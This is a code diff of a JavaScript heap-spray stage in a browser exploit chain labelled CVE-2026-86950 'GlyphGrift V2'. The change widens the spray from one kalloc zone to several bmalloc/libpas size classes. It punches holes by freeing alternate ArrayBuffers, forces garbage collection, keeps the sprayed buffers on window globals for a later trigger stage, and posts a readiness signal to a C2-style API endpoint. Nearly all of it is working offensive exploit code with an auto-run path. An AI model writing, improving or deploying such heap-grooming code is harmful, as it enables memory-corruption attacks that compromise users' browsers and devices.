@@ -1,14 +1,15 @@
 /**
  * CVE-2026-86950 GlyphGrift V2 — Stage 5 heap spray.
- * Fills target kalloc zone with ArrayBuffers, frees every other slot for holes,
- * then POSTs /api/glyphgrift-heap-ready. Survivors stay on window for post-trigger.
+ * Fills target bmalloc/libpas size classes with ArrayBuffers, frees every other slot
+ * for holes, then POSTs /api/glyphgrift-heap-ready. Survivors stay on window for post-trigger.
  */
 (function () {
   'use strict';
 
-  var SPRAY_COUNT = 4096;
+  var DEFAULT_ZONES = [48, 64, 80, 96, 128, 160, 192, 256];
+  var PER_ZONE = 1024;
   var HOLE_INTERVAL = 2;
-  var TARGET_SIZE = 128; /* kalloc.128 primary (USER DECIDED larger DX) */
+  var TARGET_SIZE = 128;
   var API = '/api/glyphgrift-heap-ready';
 
   function fillPattern(buf, marker) {
@@ -18,38 +19,70 @@
     }
   }
 
-  function runSpray(targetSize) {
-    var size = targetSize || TARGET_SIZE;
-    var allocSize = Math.max(16, size - 16);
-    var spray = [];
-    var i;
-    for (i = 0; i < SPRAY_COUNT; i++) {
-      spray[i] = new ArrayBuffer(allocSize);
-      fillPattern(spray[i], i & 0xff);
-    }
-
-    var holeCount = 0;
-    for (i = 0; i < spray.length; i += HOLE_INTERVAL) {
-      spray[i] = null;
-      holeCount++;
-    }
-
-    /* Force some GC pressure without claiming collection completed */
+  function forceGC() {
     try {
-      var junk = [];
-      for (i = 0; i < 64; i++) junk.push(new ArrayBuffer(64 * 1024));
-      junk = null;
+      for (var gc = 0; gc < 8; gc++) {
+        var junk = [];
+        for (var i = 0; i < 128; i++) junk.push(new ArrayBuffer(256 * 1024));
+        junk = null;
+      }
+      for (var gc2 = 0; gc2 < 4; gc2++) {
+        var big = new ArrayBuffer(4 * 1024 * 1024);
+        big = null;
+      }
     } catch (e) {}
+  }
 
-    window.__L0FCK_GLYPHGRIFT_SPRAY = spray;
-    window.__L0FCK_GLYPHGRIFT_SPRAY_SIZE = size;
-    window.__L0FCK_GLYPHGRIFT_SPRAY_ALLOC = allocSize;
-    window.__L0FCK_GLYPHGRIFT_HOLE_COUNT = holeCount;
+  function clearSprays() {
+    window.__L0FCK_GLYPHGRIFT_SPRAYS = null;
+    window.__L0FCK_GLYPHGRIFT_SPRAY = null;
+    forceGC();
+  }
+
+  function runSpray(targetZone, round) {
+    var zones = (targetZone && typeof targetZone === 'number' && targetZone > 0)
+      ? [targetZone]
+      : DEFAULT_ZONES;
+    var currentRound = typeof round === 'number' ? round : (window.__L0FCK_GLYPHGRIFT_ROUND || 0);
+
+    var sprays = {};
+    var totalSprayed = 0;
+    var totalHoles = 0;
+
+    for (var z = 0; z < zones.length; z++) {
+      var size = zones[z];
+      var allocSize = Math.max(16, size - 16);
+      var arr = [];
+      for (var i = 0; i < PER_ZONE; i++) {
+        arr[i] = new ArrayBuffer(allocSize);
+        fillPattern(arr[i], ((currentRound * 0x20) + (z * 0x10) + (i & 0x0f)) & 0xff);
+        totalSprayed++;
+      }
+
+      for (var h = 0; h < arr.length; h += HOLE_INTERVAL) {
+        arr[h] = null;
+        totalHoles++;
+      }
+      sprays[size] = arr;
+    }
+
+    forceGC();
+
+    window.__L0FCK_GLYPHGRIFT_SPRAYS = sprays;
+    window.__L0FCK_GLYPHGRIFT_ZONES = zones;
+    window.__L0FCK_GLYPHGRIFT_SPRAY = sprays[128] || sprays[zones[0]];
+    window.__L0FCK_GLYPHGRIFT_SPRAY_SIZE = zones[0];
+    window.__L0FCK_GLYPHGRIFT_SPRAY_ALLOC = Math.max(16, zones[0] - 16);
+    window.__L0FCK_GLYPHGRIFT_HOLE_COUNT = totalHoles;
+    window.__L0FCK_GLYPHGRIFT_ROUND = currentRound;
 
     return {
-      sprayed: SPRAY_COUNT,
-      holes: holeCount,
-      target_zone: size,
+      sprayed: totalSprayed,
+      holes: totalHoles,
+      target_zone: zones[0] || TARGET_SIZE,
+      zones: zones,
+      per_zone: PER_ZONE,
+      round: currentRound,
       phase: 'holes_ready',
       heap_spray_ready: true
     };
@@ -63,14 +96,16 @@
     }).catch(function () {});
   }
 
-  function execute(ctx) {
-    var size = window.__L0FCK_GLYPHGRIFT_ZONE || TARGET_SIZE;
-    if (ctx && ctx.log) ctx.log('glyphgrift heap spray zone=' + size);
-    var payload = runSpray(size);
+  function execute(ctx, zone, round) {
+    var chosenZone = zone || window.__L0FCK_GLYPHGRIFT_ZONE || 0;
+    var currentRound = (typeof round === 'number') ? round : (window.__L0FCK_GLYPHGRIFT_ROUND || 0);
+    if (ctx && ctx.log) ctx.log('glyphgrift multi-zone spray round=' + currentRound);
+    var payload = runSpray(chosenZone, currentRound);
     return postReady(payload).then(function () {
       if (ctx && ctx.report) {
         return ctx.report('glyphgrift_heap_spray', 'ok', JSON.stringify(payload));
       }
+      return payload;
     });
   }
 
@@ -79,10 +114,13 @@
     return execute(ctx);
   };
 
-  window.__L0FCK_GLYPHGRIFT_RUN_SPRAY = function (zone) {
+  window.__L0FCK_GLYPHGRIFT_RUN_SPRAY = function (zone, round) {
     if (zone) window.__L0FCK_GLYPHGRIFT_ZONE = zone;
-    return execute(null);
+    if (typeof round === 'number') window.__L0FCK_GLYPHGRIFT_ROUND = round;
+    return execute(null, zone, round);
   };
+  window.__L0FCK_GLYPHGRIFT_FORCE_GC = forceGC;
+  window.__L0FCK_GLYPHGRIFT_CLEAR_SPRAYS = clearSprays;
 
   if (window.__L0FCK_GLYPHGRIFT_EXPLOIT === true &&
       window.__L0FCK_GLYPHGRIFT_AUTO_SPRAY === true) {
@@ -93,3 +131,4 @@
     }
   }
 })();
+
